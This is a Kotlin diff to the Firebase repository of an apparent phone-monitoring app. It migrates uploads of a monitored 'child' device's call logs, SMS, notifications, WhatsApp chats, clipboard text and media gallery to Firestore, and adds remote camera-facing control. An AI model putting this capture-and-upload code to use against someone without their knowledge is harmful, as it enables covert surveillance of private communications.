@@ -694,13 +694,23 @@ object FirebaseRepository {
         database.reference.child("signaling").child(sessionId).child("cameraFacing").setValue(if (isFront) "front" else "back")
     }
 
+    fun setCameraFacingMode(sessionId: String, facing: String) {
+        database.reference.child("signaling").child(sessionId).child("cameraFacing").setValue(facing)
+    }
+
     fun listenToCameraFacing(sessionId: String, onFacingChanged: (isFront: Boolean) -> Unit): ValueEventListener {
+        return listenToCameraFacingMode(sessionId) { mode ->
+            onFacingChanged(mode.equals("front", ignoreCase = true))
+        }
+    }
+
+    fun listenToCameraFacingMode(sessionId: String, onFacingModeChanged: (facing: String) -> Unit): ValueEventListener {
         val ref = database.reference.child("signaling").child(sessionId).child("cameraFacing")
         val listener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val facing = snapshot.getValue(String::class.java)
                 if (facing != null) {
-                    onFacingChanged(facing == "front")
+                    onFacingModeChanged(facing)
                 }
             }
             override fun onCancelled(error: DatabaseError) {
@@ -867,7 +877,23 @@ object FirebaseRepository {
 
     // --- Call Log History ---
     fun syncCallLogs(childId: String, callLogs: List<CallLogItem>) {
-        if (callLogs.isEmpty()) return
+        if (childId.isEmpty() || callLogs.isEmpty()) return
+        
+        // 1. Primary write to Cloud Firestore
+        try {
+            val batch = firestore.batch()
+            val collection = firestore.collection("call_logs").document(childId).collection("items")
+            for (log in callLogs) {
+                val key = if (log.id.isNotEmpty()) log.id else "${log.timestamp}_${log.number.takeLast(4)}"
+                val docRef = collection.document(key)
+                batch.set(docRef, log.copy(id = key), SetOptions.merge())
+            }
+            batch.commit().addOnFailureListener { e -> crashlytics.recordException(e) }
+        } catch (e: Exception) {
+            crashlytics.recordException(e)
+        }
+
+        // 2. Backward compatibility fallback in RTDB
         val ref = database.reference.child("call_logs").child(childId)
         val map = mutableMapOf<String, Any>()
         for (log in callLogs) {
@@ -880,12 +906,17 @@ object FirebaseRepository {
     fun listenToCallLogs(childId: String, onLogs: (List<CallLogItem>) -> Unit): ValueEventListener =
         listenToChildNodeList("call_logs", childId, limit = 50, transform = { it.sortedByDescending { c -> c.timestamp } }, onLogs)
 
-    // --- Notification Mirroring ---
+    // --- Notification Mirroring (Cloud Firestore - saves RTDB Quota) ---
     fun pushNotification(childId: String, item: NotificationItem) {
-        val ref = database.reference.child("notifications").child(childId).push()
-        val toSave = item.copy(id = ref.key ?: "")
-        ref.setValue(toSave)
+        if (childId.isEmpty()) return
+        val docRef = firestore.collection("notifications").document(childId).collection("items").document()
+        val toSave = item.copy(id = docRef.id)
+        docRef.set(toSave, SetOptions.merge())
+            .addOnFailureListener { e -> crashlytics.recordException(e) }
     }
+
+    fun listenToNotificationsFirestore(childId: String, limit: Long = 50, onNotifications: (List<NotificationItem>) -> Unit): ListenerRegistration =
+        listenFirestoreCollection("notifications", childId, "timestamp", limit, onNotifications)
 
     fun listenToNotifications(childId: String, onNotifications: (List<NotificationItem>) -> Unit): ValueEventListener =
         listenToChildNodeList("notifications", childId, limit = 50, transform = { it.sortedByDescending { n -> n.timestamp } }, onNotifications)
@@ -1100,8 +1131,22 @@ object FirebaseRepository {
     // --- SMS Logs Sync (Phase 4) ---
     fun syncSmsLogs(childId: String, smsList: List<SmsItem>) {
         if (childId.isEmpty() || smsList.isEmpty()) return
-        // BUG FIX: setValue(list) poori list wipe kar deta tha agar ek bhi item fail ho
-        // Ab individual items as keyed map push karo — atomic aur safe
+
+        // 1. Primary write to Cloud Firestore
+        try {
+            val batch = firestore.batch()
+            val collection = firestore.collection("sms_logs").document(childId).collection("items")
+            for (sms in smsList) {
+                val key = if (sms.id.isNotEmpty()) sms.id else "${sms.timestamp}_${sms.address.takeLast(4)}"
+                val docRef = collection.document(key)
+                batch.set(docRef, sms.copy(id = key), SetOptions.merge())
+            }
+            batch.commit().addOnFailureListener { e -> crashlytics.recordException(e) }
+        } catch (e: Exception) {
+            crashlytics.recordException(e)
+        }
+
+        // 2. Backward compatibility fallback in RTDB
         val ref = database.reference.child("sms_logs").child(childId)
         val batchMap = mutableMapOf<String, Any>()
         for (sms in smsList) {
@@ -1709,28 +1754,52 @@ object FirebaseRepository {
         }
     }
 
-    // --- WhatsApp Chat & Status Monitoring ---
+    // --- WhatsApp Chat & Status Monitoring (Cloud Firestore - saves RTDB Bandwidth) ---
     fun pushWhatsAppLog(childId: String, item: WhatsAppLogItem) {
-        val ref = database.reference.child(FirebasePaths.WHATSAPP_LOGS).child(childId).push()
-        val toSave = item.copy(id = ref.key ?: "")
-        ref.setValue(toSave)
+        if (childId.isEmpty()) return
+        val docRef = firestore.collection("whatsapp_logs").document(childId).collection("items").document()
+        val toSave = item.copy(id = docRef.id)
+
+        // 1. Primary write to Cloud Firestore
+        docRef.set(toSave, SetOptions.merge())
+            .addOnFailureListener { e -> crashlytics.recordException(e) }
+
+        // 2. Backward compatibility fallback in RTDB
+        try {
+            val ref = database.reference.child(FirebasePaths.WHATSAPP_LOGS).child(childId).child(toSave.id)
+            ref.setValue(toSave)
+        } catch (_: Exception) {}
     }
+
+    fun listenToWhatsAppLogsFirestore(childId: String, limit: Long = 50, onLogs: (List<WhatsAppLogItem>) -> Unit): ListenerRegistration =
+        listenFirestoreCollection("whatsapp_logs", childId, "timestamp", limit, onLogs)
 
     fun listenToWhatsAppLogs(childId: String, onLogs: (List<WhatsAppLogItem>) -> Unit): ValueEventListener =
         listenToChildNodeList(FirebasePaths.WHATSAPP_LOGS, childId, limit = 100, transform = { it.sortedByDescending { w -> w.timestamp } }, onLogs)
 
-    // --- Clipboard Copy-Paste Monitoring ---
+    // --- Clipboard Copy-Paste Monitoring (Cloud Firestore - saves RTDB Bandwidth) ---
     fun pushClipboardLog(childId: String, text: String) {
         val trimmed = text.trim()
-        if (trimmed.isEmpty()) return
-        val ref = database.reference.child(FirebasePaths.CLIPBOARD_LOGS).child(childId).push()
+        if (childId.isEmpty() || trimmed.isEmpty()) return
+        val docRef = firestore.collection("clipboard_logs").document(childId).collection("items").document()
         val item = ClipboardLogItem(
-            id = ref.key ?: "",
+            id = docRef.id,
             text = trimmed,
             timestamp = System.currentTimeMillis()
         )
-        ref.setValue(item)
+
+        // 1. Primary write to Cloud Firestore
+        docRef.set(item, SetOptions.merge())
+            .addOnFailureListener { e -> crashlytics.recordException(e) }
+
+        // 2. Backward compatibility fallback in RTDB
+        try {
+            database.reference.child(FirebasePaths.CLIPBOARD_LOGS).child(childId).child(item.id).setValue(item)
+        } catch (_: Exception) {}
     }
+
+    fun listenToClipboardLogsFirestore(childId: String, limit: Long = 50, onLogs: (List<ClipboardLogItem>) -> Unit): ListenerRegistration =
+        listenFirestoreCollection("clipboard_logs", childId, "timestamp", limit, onLogs)
 
     fun listenToClipboardLogs(childId: String, onLogs: (List<ClipboardLogItem>) -> Unit): ValueEventListener =
         listenToChildNodeList(FirebasePaths.CLIPBOARD_LOGS, childId, limit = 100, transform = { it.sortedByDescending { c -> c.timestamp } }, onLogs)
@@ -1798,10 +1867,28 @@ object FirebaseRepository {
         ref.setValue(itemWithId)
     }
 
+    // --- Media Gallery (Cloud Firestore - eliminates RTDB quota bloat) ---
     fun syncMediaGallery(childUid: String, items: List<MediaGalleryItem>) {
         if (childUid.isEmpty()) return
-        database.reference.child("media_gallery").child(childUid).setValue(items)
+        val collectionRef = firestore.collection("media_gallery").document(childUid).collection("items")
+        val batch = firestore.batch()
+        items.take(100).forEach { item ->
+            val key = if (item.id.isNotEmpty()) item.id else item.filePath.hashCode().toString()
+            val docRef = collectionRef.document(key)
+            batch.set(docRef, item.copy(id = key), SetOptions.merge())
+        }
+        batch.commit().addOnFailureListener { e -> crashlytics.recordException(e) }
     }
+
+    fun pushMediaGalleryItem(childUid: String, item: MediaGalleryItem) {
+        if (childUid.isEmpty()) return
+        val docRef = firestore.collection("media_gallery").document(childUid).collection("items").document()
+        docRef.set(item.copy(id = docRef.id), SetOptions.merge())
+            .addOnFailureListener { e -> crashlytics.recordException(e) }
+    }
+
+    fun listenToMediaGalleryFirestore(childId: String, limit: Long = 50, onItems: (List<MediaGalleryItem>) -> Unit): ListenerRegistration =
+        listenFirestoreCollection("media_gallery", childId, "dateAdded", limit, onItems)
 
     fun syncFileExplorer(childUid: String, items: List<FileExplorerItem>) {
         if (childUid.isEmpty()) return
